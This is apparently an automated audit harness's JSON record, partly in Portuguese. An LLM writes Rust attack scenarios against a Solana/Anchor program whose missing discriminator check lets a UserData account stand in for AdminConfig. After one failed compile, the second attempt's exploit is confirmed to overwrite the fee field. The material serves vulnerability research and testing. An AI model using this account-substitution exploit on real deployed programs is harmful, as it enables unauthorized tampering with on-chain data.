@@ -1,0 +1,135 @@
+{
+  "category": "COSPLAY",
+  "verdict": "confirmed",
+  "exploit_successful": true,
+  "attack_result": "Success",
+  "reason": "ataque aceito e dano verificado: fee da UserData sobrescrito",
+  "attempts_used": 2,
+  "attempts": [
+    {
+      "attempt": 1,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2439,
+        "completion_tokens": 615,
+        "latency_s": 3.74
+      },
+      "raw": "{\n  \"plan\": \"Preparamos uma conta AdminConfig legítima com admin = carteira legítima e fee inicial, e uma conta UserData cujo campo authority é a pubkey do atacante. O baseline chama update_fee com a AdminConfig legítima e a autoridade legítima, provando que o cenário está correto. O ataque chama update_fee passando a conta UserData no lugar da AdminConfig, assinada pelo atacante, cuja pubkey coincide com os bytes 8..40 da UserData. O efeito mede que os bytes 40..48 da conta UserData foram sobrescritos com o novo fee, algo que o uso legítimo nunca faria naquela conta.\",\n  \"scenario\": \"let admin = Pubkey::new_unique();\\nlet attacker = Pubkey::new_unique();\\n\\nlet config_data = anchor_account_data(\\\"AdminConfig\\\", &(admin, 100u64));\\nlet config = account(&env.program_id, &config_data, None);\\n\\nlet user_data = anchor_account_data(\\\"UserData\\\", &(attacker, 0u64));\\nlet user_account = account(&env.program_id, &user_data, None);\\n\\nlet authority = wallet(1_000_000_000);\\n\\nlet metas = vec![\\n    AccountMeta::new(config.key(), false),\\n    AccountMeta::new_readonly(admin, true),\\n];\\nlet ix = env.anchor_ix(\\\"update_fee\\\", &(200u64,), metas);\\nlet contas = vec![\\n    (config.key(), config.clone()),\\n    (admin, authority.clone()),\\n];\\nlet r = env.baseline(\\\"update_fee legitimo\\\", &ix, &contas);\\n\\nlet metas_attack = vec![\\n    AccountMeta::new(user_account.key(), false),\\n    AccountMeta::new_readonly(attacker, true),\\n];\\nlet ix_attack = env.anchor_ix(\\\"update_fee\\\", &(999u64,), metas_attack);\\nlet contas_attack = vec![\\n    (user_account.key(), user_account.clone()),\\n    (attacker, wallet(1_000_000_000)),\\n];\\nlet r_attack = env.attack(\\\"cosplay UserData como AdminConfig\\\", &ix_attack, &contas_attack);\\n\\nif r_attack.program_result == ProgramResult::Success {\\n    let data = after(&r_attack, &user_account.key()).data();\\n    env.effect(\\\"fee da UserData sobrescrito\\\", read_u64(data, 40) == 999u64);\\n}\"\n}",
+      "plan": "Preparamos uma conta AdminConfig legítima com admin = carteira legítima e fee inicial, e uma conta UserData cujo campo authority é a pubkey do atacante. O baseline chama update_fee com a AdminConfig legítima e a autoridade legítima, provando que o cenário está correto. O ataque chama update_fee passando a conta UserData no lugar da AdminConfig, assinada pelo atacante, cuja pubkey coincide com os bytes 8..40 da UserData. O efeito mede que os bytes 40..48 da conta UserData foram sobrescritos com o novo fee, algo que o uso legítimo nunca faria naquela conta.",
+      "scenario": "let admin = Pubkey::new_unique();\nlet attacker = Pubkey::new_unique();\n\nlet config_data = anchor_account_data(\"AdminConfig\", &(admin, 100u64));\nlet config = account(&env.program_id, &config_data, None);\n\nlet user_data = anchor_account_data(\"UserData\", &(attacker, 0u64));\nlet user_account = account(&env.program_id, &user_data, None);\n\nlet authority = wallet(1_000_000_000);\n\nlet metas = vec![\n    AccountMeta::new(config.key(), false),\n    AccountMeta::new_readonly(admin, true),\n];\nlet ix = env.anchor_ix(\"update_fee\", &(200u64,), metas);\nlet contas = vec![\n    (config.key(), config.clone()),\n    (admin, authority.clone()),\n];\nlet r = env.baseline(\"update_fee legitimo\", &ix, &contas);\n\nlet metas_attack = vec![\n    AccountMeta::new(user_account.key(), false),\n    AccountMeta::new_readonly(attacker, true),\n];\nlet ix_attack = env.anchor_ix(\"update_fee\", &(999u64,), metas_attack);\nlet contas_attack = vec![\n    (user_account.key(), user_account.clone()),\n    (attacker, wallet(1_000_000_000)),\n];\nlet r_attack = env.attack(\"cosplay UserData como AdminConfig\", &ix_attack, &contas_attack);\n\nif r_attack.program_result == ProgramResult::Success {\n    let data = after(&r_attack, &user_account.key()).data();\n    env.effect(\"fee da UserData sobrescrito\", read_u64(data, 40) == 999u64);\n}",
+      "run": {
+        "kind": "compile_error",
+        "events": [],
+        "detail": "error[E0599]: no method named `key` found for struct `AccountSharedData` in the current scope\n  --> tests/attempt.rs:21:33\n   |\n21 |         AccountMeta::new(config.key(), false),\n   |                                 ^^^ method not found in `AccountSharedData`\n\nerror[E0599]: no method named `key` found for struct `AccountSharedData` in the current scope\n  --> tests/attempt.rs:26:17\n   |\n26 |         (config.key(), config.clone()),\n   |                 ^^^ method not found in `AccountSharedData`\n\nerror[E0599]: no method named `key` found for struct `AccountSharedData` in the current scope\n  --> tests/attempt.rs:32:39\n   |\n32 |         AccountMeta::new(user_account.key(), false),\n   |                                       ^^^ method not found in `AccountSharedData`\n\nerror[E0599]: no method named `key` found for struct `AccountSharedData` in the current scope\n  --> tests/attempt.rs:37:23\n   |\n37 |         (user_account.key(), user_account.clone()),\n   |                       ^^^ method not found in `AccountSharedData`\n\nerror[E0599]: no method named `key` found for struct `AccountSharedData` in the current scope\n  --> tests/attempt.rs:43:51\n   |\n43 |         let data = after(&r_attack, &user_account.key()).data();\n   |                                                   ^^^ method not found in `AccountSharedData`\n\nFor more information about this error, try `rustc --explain E0599`.\nerror: could not compile `dynamic-harness` (test \"attempt\") due to 5 previous errors",
+        "elapsed_s": 0.7
+      },
+      "verdict": null,
+      "reason": "erro de compilacao:\nerror[E0599]: no method named `key` found for struct `AccountSharedData` in the current scope\n  --> tests/attempt.rs:21:33\n   |\n21 |         AccountMeta::new(config.key(), false),\n   |                                 ^^^ method not found in `AccountSharedData`\n\nerror[E0599]: no method named `key` found for struct `AccountSharedData` in the current scope\n  --> tests/attempt.rs:26:17\n   |\n26 |         (config.key(), config.clone()),\n   |                 ^^^ method not found in `AccountSharedData`\n\nerror[E0599]: no method named `key` found for struct `AccountSharedData` in the current scope\n  --> tests/attempt.rs:32:39\n   |\n32 |         AccountMeta::new(user_account.key(), false),\n   |                                       ^^^ method not found in `AccountSharedData`\n\nerror[E0599]: no method named `key` found for struct `AccountSharedData` in the current scope\n  --> tests/attempt.rs:37:23\n   |\n37 |         (user_account.key(), user_account.clone()),\n   |                       ^^^ method not found in `AccountSharedData`\n\nerror[E0599]: no method named `key` found for struct `AccountSharedData` in the current scope\n  --> tests/attempt.rs:43:51\n   |\n43 |         let data = after(&r_attack, &user_account.key()).data();\n   |                                                   ^^^ method not found in `AccountSharedData`\n\nFor more information about this error, try `rustc --explain E0599`.\nerror: could not compile `dynamic-harness` (test \"attempt\") due to 5 previous errors"
+    },
+    {
+      "attempt": 2,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 3245,
+        "completion_tokens": 646,
+        "latency_s": 3.66
+      },
+      "raw": "{\n  \"plan\": \"Preparo uma conta AdminConfig legítima com admin = signer e uma conta UserData cujo campo authority é o atacante. O baseline chama update_fee com a AdminConfig e o admin signer, provando que o cenário está correto. O ataque passa a UserData no lugar da AdminConfig, assinada pelo atacante; se o programa aceitar, ele lerá os bytes 8..40 (authority do atacante) como admin e sobrescreverá o campo de fee da UserData. O efeito mede se os bytes 40..48 da UserData foram alterados para o novo fee, algo que o uso legítimo não faria.\",\n  \"scenario\": \"let admin = Pubkey::new_unique();\\nlet attacker = Pubkey::new_unique();\\n\\nlet config_key = Pubkey::new_unique();\\nlet config_data = anchor_account_data(\\\"AdminConfig\\\", &(admin, 100u64));\\nlet config = account(&env.program_id, &config_data, None);\\n\\nlet user_key = Pubkey::new_unique();\\nlet user_data = anchor_account_data(\\\"UserData\\\", &(attacker, 0u64));\\nlet user_account = account(&env.program_id, &user_data, None);\\n\\nlet admin_wallet = wallet(1_000_000_000);\\nlet attacker_wallet = wallet(1_000_000_000);\\n\\nlet metas = vec![\\n    AccountMeta::new(config_key, false),\\n    AccountMeta::new_readonly(admin, true),\\n];\\nlet ix = env.anchor_ix(\\\"update_fee\\\", &(200u64,), metas);\\nlet contas = vec![\\n    (config_key, config.clone()),\\n    (admin, admin_wallet.clone()),\\n];\\nlet r = env.baseline(\\\"update_fee legitimo\\\", &ix, &contas);\\n\\nlet metas_attack = vec![\\n    AccountMeta::new(user_key, false),\\n    AccountMeta::new_readonly(attacker, true),\\n];\\nlet ix_attack = env.anchor_ix(\\\"update_fee\\\", &(999u64,), metas_attack);\\nlet contas_attack = vec![\\n    (user_key, user_account.clone()),\\n    (attacker, attacker_wallet.clone()),\\n];\\nlet r_attack = env.attack(\\\"cosplay UserData como AdminConfig\\\", &ix_attack, &contas_attack);\\n\\nif r_attack.program_result == ProgramResult::Success {\\n    let data = after(&r_attack, &user_key).data();\\n    env.effect(\\\"fee da UserData sobrescrito\\\", read_u64(data, 40) == 999u64);\\n}\"\n}",
+      "plan": "Preparo uma conta AdminConfig legítima com admin = signer e uma conta UserData cujo campo authority é o atacante. O baseline chama update_fee com a AdminConfig e o admin signer, provando que o cenário está correto. O ataque passa a UserData no lugar da AdminConfig, assinada pelo atacante; se o programa aceitar, ele lerá os bytes 8..40 (authority do atacante) como admin e sobrescreverá o campo de fee da UserData. O efeito mede se os bytes 40..48 da UserData foram alterados para o novo fee, algo que o uso legítimo não faria.",
+      "scenario": "let admin = Pubkey::new_unique();\nlet attacker = Pubkey::new_unique();\n\nlet config_key = Pubkey::new_unique();\nlet config_data = anchor_account_data(\"AdminConfig\", &(admin, 100u64));\nlet config = account(&env.program_id, &config_data, None);\n\nlet user_key = Pubkey::new_unique();\nlet user_data = anchor_account_data(\"UserData\", &(attacker, 0u64));\nlet user_account = account(&env.program_id, &user_data, None);\n\nlet admin_wallet = wallet(1_000_000_000);\nlet attacker_wallet = wallet(1_000_000_000);\n\nlet metas = vec![\n    AccountMeta::new(config_key, false),\n    AccountMeta::new_readonly(admin, true),\n];\nlet ix = env.anchor_ix(\"update_fee\", &(200u64,), metas);\nlet contas = vec![\n    (config_key, config.clone()),\n    (admin, admin_wallet.clone()),\n];\nlet r = env.baseline(\"update_fee legitimo\", &ix, &contas);\n\nlet metas_attack = vec![\n    AccountMeta::new(user_key, false),\n    AccountMeta::new_readonly(attacker, true),\n];\nlet ix_attack = env.anchor_ix(\"update_fee\", &(999u64,), metas_attack);\nlet contas_attack = vec![\n    (user_key, user_account.clone()),\n    (attacker, attacker_wallet.clone()),\n];\nlet r_attack = env.attack(\"cosplay UserData como AdminConfig\", &ix_attack, &contas_attack);\n\nif r_attack.program_result == ProgramResult::Success {\n    let data = after(&r_attack, &user_key).data();\n    env.effect(\"fee da UserData sobrescrito\", read_u64(data, 40) == 999u64);\n}",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": ""
+          },
+          {
+            "step": "baseline",
+            "note": "update_fee legitimo",
+            "result": "Success",
+            "compute_units": 1493,
+            "account_flags": "-w,sr",
+            "ix_head": "bc5e51de3e8f7fa8",
+            "accounts": [
+              {
+                "key": "11111112D1oxKts8YPdTJRG5FzxTNpMtWmq8hkVx3",
+                "signer": false,
+                "writable": true,
+                "owner": "HS241bzcteDvCTi6UMEfecj3o8JieRvZVL3F1zhZGPxP",
+                "data_len": 48,
+                "head": "9c0a4fa147093e4d",
+                "digest": "bb2574fd7d2eefb2",
+                "post": "9c0a4fa147093e4d0000000000000001000000000000000000000000000000000000000000000000c800000000000000"
+              },
+              {
+                "key": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "attack",
+            "note": "cosplay UserData como AdminConfig",
+            "result": "Success",
+            "compute_units": 1493,
+            "account_flags": "-w,sr",
+            "ix_head": "bc5e51de3e8f7fa8",
+            "accounts": [
+              {
+                "key": "11111112cMQwSC9qirWGjZM6gLGwW69X22mqwLLGP",
+                "signer": false,
+                "writable": true,
+                "owner": "HS241bzcteDvCTi6UMEfecj3o8JieRvZVL3F1zhZGPxP",
+                "data_len": 48,
+                "head": "8bf8a7cbfddcd2dd",
+                "digest": "473ba109497a3620",
+                "post": "8bf8a7cbfddcd2dd0000000000000002000000000000000000000000000000000000000000000000e703000000000000"
+              },
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "effect",
+            "note": "fee da UserData sobrescrito",
+            "holds": true
+          }
+        ],
+        "runtime_trace": [
+          "Program HS241bzcteDvCTi6UMEfecj3o8JieRvZVL3F1zhZGPxP invoke [1]",
+          "Program HS241bzcteDvCTi6UMEfecj3o8JieRvZVL3F1zhZGPxP consumed 1493 of 1400000 compute units",
+          "Program HS241bzcteDvCTi6UMEfecj3o8JieRvZVL3F1zhZGPxP success",
+          "Program HS241bzcteDvCTi6UMEfecj3o8JieRvZVL3F1zhZGPxP invoke [1]",
+          "Program HS241bzcteDvCTi6UMEfecj3o8JieRvZVL3F1zhZGPxP consumed 1493 of 1400000 compute units",
+          "Program HS241bzcteDvCTi6UMEfecj3o8JieRvZVL3F1zhZGPxP success"
+        ],
+        "elapsed_s": 1.7
+      },
+      "verdict": "confirmed",
+      "reason": "ataque aceito e dano verificado: fee da UserData sobrescrito"
+    }
+  ],
+  "case_id": "SSP-06-A-V",
+  "static_finding": {
+    "category": "COSPLAY",
+    "confidence": "high",
+    "evidence": "let data = ctx.accounts.config.try_borrow_data()?;\nlet admin_bytes: [u8; 32] = data[8..40].try_into()...",
+    "explanation": "Os dados da conta sao desserializados manualmente a partir de `UncheckedAccount` sem validar o discriminador de 8 bytes do Anchor. O codigo assume que os bytes 8..40 sao o campo `admin` de `AdminConfig`, mas qualquer conta com layout compativel (por exemplo `UserData`, cujo campo `authority` tambem ocupa 8..40) pode ser passada.",
+    "attack_hypothesis": "Um atacante passa uma conta `UserData` (ou qualquer conta com 8 bytes de discriminador seguidos de uma pubkey controlada) no lugar de `AdminConfig`. O codigo le os bytes 8..40 como se fossem o admin, e se essa pubkey for a do atacante, a verificacao passa e o campo de fee e sobrescrito indevidamente."
+  }
+}
